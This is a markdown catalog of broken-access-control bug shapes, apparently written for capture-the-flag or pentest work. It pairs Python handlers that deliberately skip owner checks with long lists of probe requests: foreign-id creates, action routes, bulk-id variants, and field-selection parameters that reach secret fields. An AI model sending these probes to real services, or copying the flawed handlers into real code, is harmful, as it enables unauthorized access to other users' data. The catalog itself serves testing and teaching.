# Extended corpus — the deep shape catalog

The long-tail shapes — every position where the check can differ.

---

## 1. The "the check is on the wrong object" bug

```python
def get_order(order_id):
    order = Order.get(order_id)
    check_owner(order.user_id)         # checks the ORDER's owner
    return order

def get_invoice(invoice_id):
    invoice = Invoice.get(invoice_id)
    # no check_owner!
    return invoice                     # invoice reachable even if order isn't
```

`/orders/42` is checked; `/invoices/{invoice_id}` (linked to the order)
isn't — the linked object is the path.

## 2. The "the check is on the parent, child is reachable" bug

```
GET /users/42/orders/1001
```

The check is `user_id == session.user` on the parent (`42`); the child
lookup (`1001`) may resolve any order.

## 3. The "the check is on the route, not the helper" bug

```python
@app.route('/users/<id>')
@requires_login
def user(id): ...

@app.route('/api/users/<id>')   # calls the same helper, no decorator
def api_user(id):
    return User.get(id)
```

## 4. The "list-scope vs item-scope" asymmetry

```
GET /orders       → ALL orders   # the list isn't scoped
GET /orders/1001  → 403           # the item is
or
GET /orders       → your orders  # the list is
GET /orders/1001  → any order    # the item isn't
```

Check both directions — the asymmetry is the bug.

## 5. The "the create binds a foreign id" bug

```
POST /orders {"user_id":1}
POST /orders {"owner_id":1}
POST /orders {"author_id":1}
POST /orders {"for_user":1}
```

The create accepts `user_id`/`owner_id` — you create an object *as*
another user, or *for* another user.

## 6. The "the delete skips the check" bug

```
DELETE /orders/42
```

The delete handler doesn't check owner — `pre-probe` blocks until the
write semantics are understood; test on your own second object.

## 7. The "the action skips the check" bug

```
POST /orders/42/cancel     POST /orders/42/refund    POST /orders/42/ship
POST /orders/42/approve    POST /orders/42/reject    POST /orders/42/publish
POST /orders/42/archive    POST /orders/42/delete    POST /orders/42/restore
POST /orders/42/share      POST /orders/42/export    POST /orders/42/duplicate
POST /orders/42/transfer   POST /orders/42/assign    POST /orders/42/claim
POST /orders/42/release    POST /orders/42/finalize  POST /orders/42/submit
POST /orders/42/review     POST /orders/42/sign      POST /orders/42/execute
POST /orders/42/run        POST /orders/42/trigger   POST /orders/42/schedule
POST /orders/42/retry      POST /orders/42/restart   POST /orders/42/rebuild
POST /orders/42/promote    POST /orders/42/demote    POST /orders/42/escalate
POST /orders/42/upgrade    POST /orders/42/downgrade POST /orders/42/merge
POST /orders/42/split      POST /orders/42/join      POST /orders/42/attach
POST /orders/42/detach     POST /orders/42/link      POST /orders/42/unlink
POST /orders/42/pin        POST /orders/42/unpin     POST /orders/42/star
POST /orders/42/like       POST /orders/42/favorite  POST /orders/42/bookmark
POST /orders/42/watch      POST /orders/42/follow    POST /orders/42/subscribe
POST /orders/42/tag        POST /orders/42/flag      POST /orders/42/label
POST /orders/42/verify     POST /orders/42/confirm   POST /orders/42/approve
POST /orders/42/accept     POST /orders/42/reject    POST /orders/42/grant
POST /orders/42/revoke     POST /orders/42/allow     POST /orders/42/deny
POST /orders/42/permit     POST /orders/42/forbid    POST /orders/42/whitelist
POST /orders/42/blacklist  POST /orders/42/ban       POST /orders/42/block
POST /orders/42/mute       POST /orders/42/restrict  POST /orders/42/limit
POST /orders/42/feature    POST /orders/42/premium   POST /orders/42/paid
POST /orders/42/free       POST /orders/42/bill      POST /orders/42/charge
POST /orders/42/invoice    POST /orders/42/settle    POST /orders/42/dispute
POST /orders/42/resolve    POST /orders/42/close     POST /orders/42/reopen
POST /orders/42/expire     POST /orders/42/renew     POST /orders/42/extend
POST /orders/42/queue      POST /orders/42/triage    POST /orders/42/reassign
POST /orders/42/delegate   POST /orders/42/dispatch  POST /orders/42/send
POST /orders/42/recall     POST /orders/42/retract   POST /orders/42/withdraw
POST /orders/42/void       POST /orders/42/nullify   POST /orders/42/invalidate
POST /orders/42/validate   POST /orders/42/verify    POST /orders/42/authenticate
POST /orders/42/certify    POST /orders/42/accredit  POST /orders/42/license
POST /orders/42/register   POST /orders/42/deregister POST /orders/42/enroll
POST /orders/42/lock       POST /orders/42/unlock    POST /orders/42/freeze
POST /orders/42/hide       POST /orders/42/unhide    POST /orders/42/redact
POST /orders/42/encrypt    POST /orders/42/decrypt   POST /orders/42/sign
POST /orders/42/seal       POST /orders/42/unseal    POST /orders/42/protect
POST /orders/42/backup     POST /orders/42/snapshot  POST /orders/42/restore
POST /orders/42/sync       POST /orders/42/mirror    POST /orders/42/replicate
POST /orders/42/clone      POST /orders/42/copy      POST /orders/42/fork
POST /orders/42/exec       POST /orders/42/logs      POST /orders/42/inspect
POST /orders/42/debug      POST /orders/42/trace     POST /orders/42/profile
POST /orders/42/test       POST /orders/42/scan      POST /orders/42/audit
POST /orders/42/healthcheck POST /orders/42/status   POST /orders/42/version
POST /orders/42/config     POST /orders/42/env       POST /orders/42/secrets
POST /orders/42/keys       POST /orders/42/tokens    POST /orders/42/cache
POST /orders/42/queue      POST /orders/42/jobs      POST /orders/42/workers
```

The action-name corpus — every verb the route might carry. The bug is
the action handler that skips the owner check.

## 8. The "the bulk is unscoped" shape

```
POST /bulk {"ids":[1,2,3]}
POST /batch {"ids":[1,2,3]}
GET /users?ids=1,2,3
GET /users?ids[]=1&ids[]=2&ids[]=3
GET /users?id=1&id=2&id=3
POST /export {"user_ids":[1,2,3]}
POST /report {"for":[1,2,3]}
POST /aggregate {"subjects":[1,2,3]}
POST /fetch {"ids":[1,2,3]}
POST /resolve {"ids":[1,2,3]}
POST /lookup {"ids":[1,2,3]}
POST /hydrate {"ids":[1,2,3]}
POST /multi_get {"ids":[1,2,3]}
POST /batch_get {"ids":[1,2,3]}
POST /users {"ids":[1,2,3]}
POST /users {"id":[1,2,3]}
POST /users {"user_ids":[1,2,3]}
POST /users {"ids":"1,2,3"}
POST /users {"ids":"1 2 3"}
POST /users {"ids":"1;2;3"}
POST /users {"ids":"1|2|3"}
POST /users {"ids":[1,"2","3"]}
POST /users {"ids":[{"id":1},{"id":2}]}
POST /users {"ids":{"0":1,"1":2}}
POST /users {"user_id":[1,2,3]}
POST /users {"owner_id":[1,2,3]}
POST /users {"account_id":[1,2,3]}
POST /users {"tenant_id":[1,2,3]}
```

The bulk-op corpus — every verb (`bulk`, `batch`, `multi_get`, `export`,
`resolve`, `hydrate`, `fetch_all`, `get_many`) and every id-field shape
(`ids`, `id`, `user_ids`, `owner_id`, `account_id`, `tenant_id`).

## 9. The "the parent is the scope" bug

`/tenants/7/users/42` — the check is `tenant==session.tenant` on `7`;
the child `42` is reachable across tenants if the child's own scope
isn't enforced.

## 10. The "the list is the leak" shape

`GET /api/users` returns every user's `id`+`email` — the collection's
unscoped dump is the enumeration source for the opaque ids.

## 11. The "the response leaks the schema" shape

`GET /api/me` → `{"id":2,"role":"user","secret":"..."}` — the response
names the privileged fields; `?fields=`/`?include=` or a mass-assign
binds them.

## 12. The "the field-list is the leak" shape

```
GET /users/1?fields=id,email,role,secret
GET /users/1?include=role,secret
GET /users/1?select=id,email,role,secret
GET /users/1?expand=user.role
GET /users/1?populate=owner.secret
GET /users/1?with=role
GET /users/1?embed=role
GET /users/1?join=role
GET /users/1?attrs=id,email,role
GET /users/1?properties=id,email,role
GET /users/1?projection=id,email,role
GET /users/1?only=id,email,role
GET /users/1?pick=id,email,role
GET /users/1?output=id,email,role
GET /users/1?output_fields=id,email,role
GET /users/1?response_fields=id,email,role
GET /users/1?return=id,email,role
GET /users/1?returns=id,email,role
GET /users/1?columns=id,email,role
GET /users/1?meta=count
GET /users?count=true
GET /users?_count=true
GET /users?with_count=true
GET /users?total=true
GET /users?aggregate=count
GET /users?distinct=user_id
GET /users?group=user_id
GET /users?group_by=owner
GET /users?sort=user_id
GET /users?sort_by=owner
GET /users?order=role
GET /users?order_by=role
```

The `?fields=`/`?include=`/`?select=`/`?expand=`/`?populate=`/`?columns=`/
`?projection=`/`?pick=`/`?only=`/`?attrs=` field-list — the column-picker
reaches privileged columns. The `?count`/`?distinct`/`?group`/`?sort`/
`?order` is the side-channel.

## 13. The "the response is the flag" edge

`GET /users/1` → `{"id":1,"flag":"flag{...}"}` — the admin's row carries
the flag field directly. `pre-flag` on the value.
